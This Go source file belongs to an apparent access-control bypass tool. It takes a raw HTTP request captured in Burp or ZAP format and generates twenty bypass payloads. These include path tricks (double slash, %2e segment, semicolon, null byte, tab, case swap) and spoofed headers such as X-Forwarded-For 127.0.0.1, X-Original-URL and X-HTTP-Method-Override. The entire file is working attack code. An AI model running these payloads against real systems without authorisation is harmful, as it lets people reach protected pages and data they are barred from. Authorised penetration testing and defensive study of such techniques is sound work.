// Package bypass — raw HTTP request bypass technique.
package bypass

import (
	"bytes"
	"fmt"
	"strings"
)

// RawRequestTechnique generates bypass payloads from a parsed raw HTTP request
// (Burp/ZAP format).
type RawRequestTechnique struct{}

func (r *RawRequestTechnique) Name() string        { return "raw-request" }
func (r *RawRequestTechnique) Description() string { return "Raw request mutation bypass" }

// ParseRawRequest parses a raw HTTP request (Burp/ZAP format) from bytes.
// Format:
//
//	METHOD /path HTTP/1.1
//	Header1: Value1
//	Header2: Value2
//
//	body
func ParseRawRequest(data []byte) (*RawHTTPRequest, error) {
	// Normalise line endings.
	normalized := bytes.ReplaceAll(data, []byte("\r\n"), []byte("\n"))
	normalized = bytes.ReplaceAll(normalized, []byte("\r"), []byte("\n"))

	// Split headers and body on double newline.
	parts := bytes.SplitN(normalized, []byte("\n\n"), 2)
	headerSection := string(parts[0])
	body := ""
	if len(parts) > 1 {
		body = string(parts[1])
	}

	lines := strings.Split(headerSection, "\n")
	if len(lines) == 0 {
		return nil, fmt.Errorf("empty raw request")
	}

	// Parse request line: METHOD /path HTTP/x.x
	reqLine := strings.TrimSpace(lines[0])
	reqParts := strings.SplitN(reqLine, " ", 3)
	if len(reqParts) < 2 {
		return nil, fmt.Errorf("malformed request line: %q", reqLine)
	}

	method := reqParts[0]
	path := reqParts[1]
	httpVersion := "HTTP/1.1"
	if len(reqParts) >= 3 {
		httpVersion = reqParts[2]
	}

	// Parse headers.
	var headers []RawHeader
	host := ""
	for _, line := range lines[1:] {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.IndexByte(line, ':')
		if idx < 0 {
			continue
		}
		key := strings.TrimSpace(line[:idx])
		val := strings.TrimSpace(line[idx+1:])
		headers = append(headers, RawHeader{Key: key, Value: val})
		if strings.EqualFold(key, "Host") {
			host = val
		}
	}

	if host == "" {
		return nil, fmt.Errorf("raw request missing Host header")
	}

	// Infer scheme from host.
	scheme := "https"
	if strings.HasSuffix(host, ":80") {
		scheme = "http"
	}

	return &RawHTTPRequest{
		Method:      method,
		Path:        path,
		HTTPVersion: httpVersion,
		Headers:     headers,
		Body:        body,
		Host:        host,
		Scheme:      scheme,
	}, nil
}

// Generate produces bypass payloads from a raw request.
// Returns nil if no raw request is present on the target.
func (r *RawRequestTechnique) Generate(target *Target) []Payload {
	raw := target.RawRequest
	if raw == nil {
		return nil
	}

	baseURL := raw.Scheme + "://" + raw.Host + raw.Path
	baseHeaders := rawHeadersToMap(raw.Headers)

	var payloads []Payload

	add := func(desc, method, urlStr string, extraHeaders map[string]string) {
		hdrs := copyHeaders(baseHeaders)
		for k, v := range extraHeaders {
			hdrs[k] = v
		}
		payloads = append(payloads, Payload{
			TechniqueName: r.Name(),
			Description:   desc,
			Method:        method,
			URL:           urlStr,
			Headers:       hdrs,
			Body:          raw.Body,
		})
	}

	// 1. Original request as-is.
	add("raw-original", raw.Method, baseURL, nil)

	// 2-5. Method swap.
	for _, m := range []string{"GET", "POST", "PUT", "OPTIONS"} {
		if m == raw.Method {
			continue
		}
		extra := map[string]string{}
		if m == "POST" || m == "PUT" {
			extra["Content-Length"] = "0"
		}
		add("raw-method-"+m, m, baseURL, extra)
	}

	// 6. Path with trailing slash.
	if !strings.HasSuffix(raw.Path, "/") {
		add("raw-trailing-slash", raw.Method, baseURL+"/", nil)
	}

	// 7. Path with double slash prefix.
	add("raw-double-slash", raw.Method,
		raw.Scheme+"://"+raw.Host+"//"+strings.TrimPrefix(raw.Path, "/"), nil)

	// 8. Path case swap (first char of last segment).
	add("raw-path-case", raw.Method, raw.Scheme+"://"+raw.Host+swapFirstCharCase(raw.Path), nil)

	// 9. URL-encoded dot path.
	add("raw-dot-segment", raw.Method,
		raw.Scheme+"://"+raw.Host+"/%2e"+raw.Path, nil)

	// 10. Semicolon injection.
	add("raw-semicolon", raw.Method,
		raw.Scheme+"://"+raw.Host+raw.Path+";", nil)

	// 11. Null byte.
	add("raw-null-byte", raw.Method,
		raw.Scheme+"://"+raw.Host+raw.Path+"%00", nil)

	// 12. Tab injection.
	add("raw-tab", raw.Method,
		raw.Scheme+"://"+raw.Host+raw.Path+"%09", nil)

	// 13. X-Forwarded-For.
	add("raw-xff", raw.Method, baseURL, map[string]string{"X-Forwarded-For": "127.0.0.1"})

	// 14. X-Original-URL.
	add("raw-x-original-url", raw.Method, baseURL,
		map[string]string{"X-Original-URL": raw.Path})

	// 15. X-Rewrite-URL.
	add("raw-x-rewrite-url", raw.Method, baseURL,
		map[string]string{"X-Rewrite-URL": raw.Path})

	// 16. X-Forwarded-Host: localhost.
	add("raw-x-fwd-host", raw.Method, baseURL,
		map[string]string{"X-Forwarded-Host": "localhost"})

	// 17. Method override via header.
	add("raw-method-override", "POST", baseURL,
		map[string]string{"X-HTTP-Method-Override": raw.Method, "Content-Length": "0"})

	// 18. Referer set to target.
	add("raw-referer", raw.Method, baseURL,
		map[string]string{"Referer": baseURL})

	// 19. X-Forwarded-Proto: http.
	add("raw-proto-http", raw.Method, baseURL,
		map[string]string{"X-Forwarded-Proto": "http"})

	// 20. .json extension.
	add("raw-json-ext", raw.Method, baseURL+".json", nil)

	return payloads
}

// rawHeadersToMap converts a slice of RawHeader to a map.
func rawHeadersToMap(headers []RawHeader) map[string]string {
	m := make(map[string]string, len(headers))
	for _, h := range headers {
		m[h.Key] = h.Value
	}
	return m
}

// copyHeaders shallow-copies a header map.
func copyHeaders(src map[string]string) map[string]string {
	out := make(map[string]string, len(src))
	for k, v := range src {
		out[k] = v
	}
	return out
}

// swapFirstCharCase swaps the case of the first alpha character in the last
// path segment.
func swapFirstCharCase(path string) string {
	idx := strings.LastIndexByte(path, '/')
	if idx < 0 || idx >= len(path)-1 {
		return path
	}
	suffix := []byte(path[idx+1:])
	for i, c := range suffix {
		if c >= 'A' && c <= 'Z' {
			suffix[i] = c + 32
			break
		} else if c >= 'a' && c <= 'z' {
			suffix[i] = c - 32
			break
		}
	}
	return path[:idx+1] + string(suffix)
}
